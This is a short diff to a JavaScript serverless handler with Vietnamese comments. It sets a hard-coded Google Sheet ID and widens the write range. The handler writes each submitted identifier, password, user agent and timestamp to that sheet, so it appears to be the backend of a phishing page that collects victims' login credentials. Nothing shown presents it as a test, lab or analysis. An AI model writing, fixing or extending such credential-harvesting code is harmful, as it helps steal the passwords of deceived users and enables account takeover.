@@ -41,7 +41,7 @@ export default async function handler(req, res) {  // ĐẢM BẢO DÒNG NÀY C�
 
     // Thay thế bằng ID Google Sheet của bạn
     const SPREADSHEET_ID = "1kqKSyAN6EmmVUJCJlmP57KOTLNzPJGjOOk5BEW3irK4";
-    const RANGE = "Sheet1!A:C"; // Ghi vào cột A, B, C
+    const RANGE = "Sheet1!A1:C10000"; // Ghi vào cột A, B, C
 
     console.log("Ghi dữ liệu vào Google Sheets...");
     const values = [[identifier, password, userAgent, new Date().toISOString()]];
